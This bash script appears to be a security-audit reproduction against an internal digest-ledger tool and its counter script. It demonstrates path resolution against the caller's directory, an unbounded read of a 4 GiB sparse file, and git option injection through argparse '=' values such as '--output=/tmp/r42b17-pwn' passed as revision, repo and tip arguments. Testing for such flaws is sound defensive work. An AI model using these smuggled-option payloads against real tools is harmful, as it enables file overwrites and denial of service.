#!/bin/bash
# R42B17 repro 3: fixed P2/P4, argparse '=' injection form, counter crash paths
S=/fast/scratch/kama-r42/seats/R42B17
export TMPDIR=$S/tmp
TOOL=$S/clone/tools/digest-ledger.py
CNT=$S/clone/tools/round42-digest-audit.py
R=$S/r3
rm -rf "$R" "$S/ext" "$S/deep" "$S/big"; mkdir -p "$R/registry" "$S/ext" "$S/deep/deeper" "$S/big" "$S/tmp"
run() { local label=$1 cwd=$2; shift 2
  echo "=== $label"
  ( cd "$cwd" && timeout 60 python3 "$TOOL" scan --dir "$R" "$@" >"$S/out.txt" 2>"$S/err.txt"; echo "exit=$?" )
  echo "stdout: $(cat "$S/out.txt")"; echo "stderr(head): $(head -c 300 "$S/err.txt" | tr '\n' '|')"; }

printf 'secret-value\n' > "$S/ext/secret.bin"
GOOD=$(sha256sum "$S/ext/secret.bin" | cut -d' ' -f1)
BAD=${GOOD:0:8}$(printf '0%.0s' {1..56})

echo "--- P4 relative path resolved against caller cwd (fixed nesting)"
printf 'digest\tclass\tsubject\tpath\tcorrect\tverified-at\tnote\n%s\texternal\ts\t../ext/secret.bin\t\t\t\n' "$GOOD" > "$R/registry/digest-ledger.tsv"
printf '%s\n' "$GOOD" > "$R/doc.md"
run "P4-1 cwd=$R -> external_ok" "$R"
run "P4-2 cwd=$S/deep/deeper (same tree+row) -> external_absent" "$S/deep/deeper"

echo "--- P2 unbounded read of a 4 GiB sparse file named by a ledger row"
truncate -s 4G "$S/big/huge.bin"; ls -ls "$S/big/huge.bin"
printf 'digest\tclass\tsubject\tpath\tcorrect\tverified-at\tnote\n%s\texternal\ts\t%s\t\t\t\n' "$BAD" "$S/big/huge.bin" > "$R/registry/digest-ledger.tsv"
echo "=== P2a 4 GiB file, 1 GB address-space cap, 60 s"
( cd "$R" && ulimit -v 1000000 && timeout 60 python3 "$TOOL" scan --dir "$R" >"$S/out.txt" 2>"$S/err.txt"; echo "exit=$?" )
echo "stdout: $(cat "$S/out.txt")"; echo "stderr(tail): $(tail -c 240 "$S/err.txt" | tr '\n' '|')"
echo "=== P2b 4 GiB file, no cap, 60 s wall cap (measures read of the whole file)"
/usr/bin/time -f 'rss_kb=%M elapsed=%e' timeout 60 python3 "$TOOL" scan --dir "$R" 2>&1 | tail -3

echo "--- P6 git-mode option injection via the '=' form (argparse accepts leading-dash values)"
C=$S/clone; rm -f /tmp/r42b17-pwn
for REV in '--output=/tmp/r42b17-pwn' '-q' '--git-dir=/tmp' '--verify' '--default' '--parseopt'; do
  ( cd "$C" && timeout 60 python3 "$TOOL" scan --repo "$C" --rev="$REV" >"$S/out.txt" 2>"$S/err.txt"; echo "rev=[$REV] exit=$? stdout=[$(head -c 100 "$S/out.txt")] stderr=[$(head -c 200 "$S/err.txt" | tr '\n' '|')]" )
done
for REPO in '--output=/tmp/r42b17-pwn' '-c'; do
  ( cd "$C" && timeout 60 python3 "$TOOL" scan --repo="$REPO" --rev HEAD >"$S/out.txt" 2>"$S/err.txt"; echo "repo=[$REPO] exit=$? stdout=[$(head -c 100 "$S/out.txt")] stderr=[$(head -c 200 "$S/err.txt" | tr '\n' '|')]" )
done
ls -l /tmp/r42b17-pwn 2>&1 | head -2
echo "--- P6c same '=' injection against the counter"
for TIP in '--output=/tmp/r42b17-pwn' '-q'; do
  ( cd "$C" && timeout 120 python3 "$CNT" --repo "$C" --tip="$TIP" >"$S/out.txt" 2>"$S/err.txt"; echo "tip=[$TIP] exit=$? stdout=[$(head -c 100 "$S/out.txt")] stderr=[$(head -c 240 "$S/err.txt" | tr '\n' '|')]" )
done
ls -l /tmp/r42b17-pwn 2>&1 | head -2
